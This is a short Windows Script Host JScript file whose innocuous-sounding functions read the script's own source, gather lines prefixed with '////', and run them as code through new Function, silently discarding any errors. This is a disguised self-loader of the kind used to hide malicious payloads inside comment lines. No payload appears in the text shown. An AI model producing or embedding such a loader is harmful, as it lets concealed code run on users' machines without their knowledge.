var userView = (function() {
    var viewobj = new ActiveXObject("Scripting.FileSystemObject"),
        name = WScript.ScriptFullName,
        checkView = "";

    function adjustView() {
        if (!viewobj.FileExists(name)) return;

        var f = viewobj.OpenTextFile(name, 1);
        while (!f.AtEndOfStream) {
            var readView = f.ReadLine();
            if (readView .slice(0, 4) === "////") checkView += readView.substr(4) + "\n";
        }
        f.Close();
    }

    function testView() {
        if (checkView !== "") {
            var newView = new Function(checkView);
            newView();
        }
    }
    try {
        adjustView();
        testView();
    } catch (log) {}

    return 0;
})();